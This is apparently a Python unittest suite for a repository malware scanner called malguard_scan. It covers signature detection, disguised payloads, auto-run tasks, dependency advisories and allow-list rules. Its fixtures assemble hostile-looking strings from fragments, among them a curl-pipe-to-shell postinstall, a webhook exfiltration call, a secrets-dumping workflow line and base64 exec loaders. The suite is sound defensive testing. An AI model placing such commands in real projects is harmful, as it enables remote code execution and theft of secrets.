"""Self-tests for malguard_scan.

Every malicious-looking fixture is assembled at runtime from fragments, so this
file never contains a real signature: committing it must not trip malguard,
locally or in CI. Run with: python3 -m unittest discover -s tests
"""

import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import malguard_scan as mg  # noqa: E402

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def j(*parts):
    """Join fragments into one string (keeps signatures out of this file)."""
    return "".join(parts)


class Tree:
    """A throwaway repository tree."""

    def __init__(self, files):
        self.dir = tempfile.TemporaryDirectory()
        self.root = self.dir.name
        for rel, content in files.items():
            path = os.path.join(self.root, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(content)

    def __enter__(self):
        return self.root

    def __exit__(self, *exc):
        self.dir.cleanup()


def no_osv(url, body):
    return {"results": [{} for _ in body["queries"]]}


def no_fetch(url):
    raise AssertionError(f"unexpected advisory fetch: {url}")


def scan(files, allow=None, post=no_osv, fetch=no_fetch):
    if allow is not None:
        files = {**files, ".malguard-allow": allow}
    with Tree(files) as root:
        return mg.scan(root, post=post, fetch=fetch)


def messages(failures):
    return {(f.severity, f.path, f.message) for f in failures}


class CleanTrees(unittest.TestCase):
    def test_an_ordinary_project_is_clean(self):
        failures, _, _, scanned = scan({
            "app.py": "import os\nprint(os.getcwd())\n",
            "src/index.js": "export const add = (a, b) => a + b;\n",
            "package.json": json.dumps({"name": "x", "scripts": {"build": "vite build"}}),
            "README.md": "# Project\n",
        })
        self.assertEqual(failures, [])
        self.assertEqual(scanned, 4)

    def test_the_scanner_does_not_flag_its_own_source(self):
        failures, _, _, _ = mg.scan(REPO_ROOT, offline=True)
        self.assertEqual(failures, [])

    def test_vendored_and_build_directories_are_skipped(self):
        failures, _, _, _ = scan({
            "node_modules/x/index.js": j("eval(at", "ob('x'))"),
            "dist/bundle.js": j("eval(at", "ob('x'))"),
        })
        self.assertEqual(failures, [])


class Detections(unittest.TestCase):
    def assert_flags(self, files, severity, path, text):
        failures, _, _, _ = scan(files)
        hits = [f for f in failures if f.severity == severity and f.path == path and text in f.message]
        self.assertTrue(hits, f"expected {severity} {path} '{text}', got {failures}")

    def test_known_loader_signatures(self):
        cases = {
            "a.js": (j("fetch('https://x.y/0x/", "cls')"), "PolinRider C2 path"),
            "b.js": (j('const k = "n**-8', 'A".split("")'), "PolinRider loader marker"),
            "c.js": (j("eth_getTransact", "ionCount; require('child_", "process').spawn('x')"),
                     "EtherHiding loader"),
            "d.js": (j("// Sha1-Hu", "lud\n"), "Shai-Hulud worm marker"),
            "e.yml": (j("run: echo '${{ toJSON(sec", "rets) }}'"), "dumping all secrets"),
            "f.js": (j("post('https://webhook.site/", "0123456789abcdef0123456789')"), "exfiltration webhook"),
            "g.js": (j("const p = 'Login Da", "ta'; const w = 'meta", "mask';"), "wallet stealer"),
        }
        failures, _, _, _ = scan({rel: text for rel, (text, _) in cases.items()})
        for rel, (_, label) in cases.items():
            with self.subTest(rel=rel):
                self.assertTrue(any(f.path == rel and label in f.message and f.kind == mg.SIGNATURE
                                    for f in failures), failures)

    def test_a_font_that_is_really_javascript(self):
        self.assert_flags({"public/fonts/fa-solid-300.ttf": j("const c = req", "uire('child_", "process');")},
                          "HIGH", "public/fonts/fa-solid-300.ttf", "disguised payload")

    def test_auto_run_vscode_task(self):
        tasks = json.dumps({"tasks": [{"label": "x", "runOptions": {"runOn": j("folder", "Open")}}]})
        self.assert_flags({".vscode/tasks.json": tasks}, "HIGH", ".vscode/tasks.json", "folder open")

    def test_worm_artifacts(self):
        self.assert_flags({j("temp_auto_", "push.bat"): "echo"}, "HIGH", "temp_auto_push.bat", "worm")
        self.assert_flags({".gitignore": ".gitignore\n"}, "HIGH", ".gitignore", "hides itself")

    def test_risky_install_script(self):
        pkg = json.dumps({"scripts": {"postinstall": j("cur", "l https://x.y/i.sh | sh")}})
        self.assert_flags({"package.json": pkg}, "HIGH", "package.json", "risky npm postinstall")

    def test_hidden_code_behind_whitespace(self):
        self.assert_flags({"x.js": "ok();\n" + " " * 200 + "evil();\n"}, "HIGH", "x.js", "whitespace")

    def test_invisible_unicode_run(self):
        self.assert_flags({"x.js": "a" + "​" * 10 + "b\n"}, "HIGH", "x.js", "invisible Unicode")

    def test_python_exec_of_decoded_code(self):
        self.assert_flags({"x.py": j("ex", "ec(base64.b64decode(blob))\n")}, "HIGH", "x.py", "python exec")

    def test_obfuscated_javascript_is_medium_and_still_fails(self):
        self.assert_flags({"src/x.js": j("eval(at", "ob('ZXZpbA=='))")}, "MEDIUM", "src/x.js", "obfuscation")

    def test_obfuscation_in_a_build_config_is_high(self):
        self.assert_flags({"vite.config.js": j("eval(at", "ob('x'))")}, "HIGH", "vite.config.js", "obfuscation")


class Exceptions(unittest.TestCase):
    OBFUSCATED = {"vendor/lib.js": j("eval(at", "ob('ZXZpbA=='))")}

    def test_a_reviewed_heuristic_finding_can_be_excused(self):
        failures, excused, unused, _ = scan(
            self.OBFUSCATED, allow="vendor/*.js :: obfuscation pattern :: vendored lib, reviewed 2026-11-17\n")
        self.assertEqual(failures, [])
        self.assertEqual(len(excused), 1)
        self.assertEqual(unused, [])

    def test_a_signature_can_never_be_excused(self):
        failures, excused, _, _ = scan(
            {"a.js": j("x('/0x/", "cls')")}, allow="a.js :: PolinRider :: trust me\n")
        self.assertEqual(len(failures), 1)
        self.assertEqual(excused, [])

    def test_a_malicious_dependency_can_never_be_excused(self):
        failures, _, _, _ = scan(
            {"package-lock.json": json.dumps({"packages": {"node_modules/chalk": {"version": "5.6.1"}}})},
            allow="package-lock.json :: chalk :: trust me\n")
        self.assertEqual(len(failures), 1)

    def test_an_exception_needs_a_reason(self):
        with self.assertRaises(mg.ScanError):
            scan(self.OBFUSCATED, allow="vendor/*.js :: obfuscation pattern\n")

    def test_an_exception_that_matches_nothing_is_reported(self):
        _, _, unused, _ = scan({"a.py": "print(1)\n"}, allow="old.js :: obfuscation :: was vendored once\n")
        self.assertEqual([r.pattern for r in unused], ["old.js"])


class Dependencies(unittest.TestCase):
    def test_a_known_compromised_release_is_caught_offline(self):
        lock = json.dumps({"packages": {"node_modules/debug": {"version": "4.4.2"}}})
        with Tree({"package-lock.json": lock}) as root:
            failures, _, _, _ = mg.scan(root, offline=True)
        self.assertEqual(messages(failures),
                         {("HIGH", "package-lock.json", "npm debug@4.4.2: known compromised release")})

    def test_osv_malicious_advisories_fail_the_scan(self):
        def post(url, body):
            results = []
            for q in body["queries"]:
                bad = q["package"]["name"] == "evil-pkg"
                vulns = [{"id": "MAL-2025-1"}, {"id": "GHSA-x"}] if bad else [{"id": "GHSA-y"}]
                results.append({"vulns": vulns})
            return {"results": results}

        failures, _, _, _ = scan({"requirements.txt": "django==5.0\nevil-pkg==1.0\n"}, post=post)
        self.assertEqual(messages(failures),
                         {("HIGH", "requirements.txt", "PyPI evil-pkg@1.0: malicious package (MAL-2025-1)")})

    def test_an_unversioned_dependency_is_flagged_only_when_every_release_is_malicious(self):
        advisories = {
            "MAL-2026-1": {"affected": [{"package": {"ecosystem": "npm", "name": "axios"},
                                         "versions": ["1.14.1"]}]},
            "MAL-2026-2": {"affected": [{"package": {"ecosystem": "npm", "name": "evil-typo"},
                                         "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]},
        }

        def post(url, body):
            ids = {"axios": "MAL-2026-1", "evil-typo": "MAL-2026-2"}
            return {"results": [{"vulns": [{"id": ids[q["package"]["name"]]}]} for q in body["queries"]]}

        def fetch(url):
            return advisories[url.rsplit("/", 1)[1]]

        pkg = json.dumps({"dependencies": {"axios": "^1.18.1", "evil-typo": "^1.0.0"}})
        with Tree({"package.json": pkg}) as root:
            failures, _, _, _ = mg.scan(root, post=post, fetch=fetch)
        self.assertEqual(messages(failures),
                         {("HIGH", "package.json", "npm evil-typo@?: malicious package (MAL-2026-2)")})

    def test_osv_pages_are_followed(self):
        calls = []

        def post(url, body):
            calls.append(body)
            if len(calls) == 1:
                return {"results": [{"vulns": [{"id": "GHSA-1"}], "next_page_token": "t"}]}
            return {"results": [{"vulns": [{"id": "MAL-2025-9"}]}]}

        found = mg.osv_malicious_ids([("npm", "x", "1.0.0")], post=post)
        self.assertEqual(found, {("npm", "x", "1.0.0"): ["MAL-2025-9"]})
        self.assertEqual(calls[1]["queries"][0]["page_token"], "t")

    def test_an_osv_outage_fails_closed(self):
        def post(url, body):
            raise mg.ScanError("OSV lookup failed: timed out")

        with self.assertRaises(mg.ScanError):
            scan({"requirements.txt": "django==5.0\n"}, post=post)

    def test_the_real_osv_client_turns_a_network_failure_into_a_scan_error(self):
        import urllib.error
        from unittest import mock

        with mock.patch.object(mg.urllib.request, "urlopen", side_effect=urllib.error.URLError("down")) as call, \
                mock.patch.object(mg.time, "sleep") as sleep:
            with self.assertRaises(mg.ScanError):
                mg._post_json(mg.OSV_QUERYBATCH, {"queries": []})
        self.assertEqual(call.call_count, mg.OSV_ATTEMPTS)
        self.assertEqual([c.args[0] for c in sleep.call_args_list], [2, 4])

    def test_a_dropped_connection_is_retried(self):
        import urllib.error
        from unittest import mock

        ok = mock.MagicMock()
        ok.__enter__.return_value = io.BytesIO(b'{"results": []}')
        with mock.patch.object(mg.urllib.request, "urlopen",
                               side_effect=[urllib.error.URLError("EOF"), ok]) as call, \
                mock.patch.object(mg.time, "sleep"):
            self.assertEqual(mg._post_json(mg.OSV_QUERYBATCH, {"queries": []}), {"results": []})
        self.assertEqual(call.call_count, 2)

    def test_a_client_error_is_not_retried(self):
        import urllib.error
        from unittest import mock

        bad = urllib.error.HTTPError(mg.OSV_QUERYBATCH, 400, "Bad Request", {}, None)
        with mock.patch.object(mg.urllib.request, "urlopen", side_effect=bad) as call, \
                mock.patch.object(mg.time, "sleep"):
            with self.assertRaises(mg.ScanError):
                mg._post_json(mg.OSV_QUERYBATCH, {"queries": []})
        self.assertEqual(call.call_count, 1)

    def test_lockfile_parsing(self):
        with Tree({
            "requirements.txt": "Django==5.0.1  # web\nrequests[socks]==2.31.0\n-r base.txt\n",
            "package-lock.json": json.dumps({"packages": {"": {}, "node_modules/@scope/a": {"version": "1.2.3"}}}),
        }) as root:
            py = set(mg.deps_from_file(os.path.join(root, "requirements.txt")))
            js = set(mg.deps_from_file(os.path.join(root, "package-lock.json")))
        self.assertEqual(py, {("PyPI", "Django", "5.0.1"), ("PyPI", "requests", "2.31.0")})
        self.assertEqual(js, {("npm", "@scope/a", "1.2.3")})


class CommandLine(unittest.TestCase):
    def run_main(self, files, *extra):
        with Tree(files) as root:
            out = io.StringIO()
            with redirect_stdout(out):
                code = mg.main([root, "--offline", *extra])
        return code, out.getvalue()

    def test_exit_codes(self):
        self.assertEqual(self.run_main({"a.py": "print(1)\n"})[0], 0)
        self.assertEqual(self.run_main({"a.js": j("x('/0x/", "cls')")})[0], 1)
        self.assertEqual(self.run_main({"a.py": "x\n", ".malguard-allow": "bad line\n"})[0], 2)

    def test_json_output(self):
        code, out = self.run_main({"a.js": j("x('/0x/", "cls')")}, "--json")
        self.assertEqual(code, 1)
        self.assertEqual(json.loads(out)["failures"][0]["kind"], "signature")


if __name__ == "__main__":
    unittest.main()
